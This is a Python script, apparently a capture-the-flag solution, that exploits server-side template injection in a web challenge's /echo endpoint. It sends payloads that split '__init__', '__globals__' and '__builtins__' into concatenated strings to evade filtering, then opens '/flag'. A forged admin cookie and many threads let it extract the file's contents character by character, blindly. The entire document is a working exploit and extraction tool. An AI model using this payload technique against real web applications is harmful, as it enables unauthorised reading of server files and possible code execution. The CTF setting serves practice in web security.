import requests
import concurrent.futures

url = "https://31c6ac8b-a702-4f25-895b-d4c096fdfde2.challenge.ctf.show/echo"
strings = "qwertyuiopasdfghjklzxcvbnm{}-12334567890"
target = ""

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "cookie":"user=eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJ0ZXN0In0.ZzC9AQ.hbEoNTSwLImc98ykp0j_EJ_VlnQ"
}


def check_character(i, j, string):
    payload = '''
    cycler["__in"+"it__"]["__glo"+"bals__"]
    ["__bui"+"ltins__"].__import__('builtins').open('/flag').read({})[{}]=='{}'
    '''.format(j + 1, j, string)
    data = {"message": payload}
    r = requests.post(url=url, data=data, headers=headers, verify=False)
    return string if r.status_code == 200 and "your answer is True" in r.text else None


with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    for i in range(50):
        futures = []
        for j in range(50):
            for string in strings:
                futures.append(executor.submit(check_character, i, j, string))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(result)
                target += result
                if result == "}":
                    print(target)
                    exit()
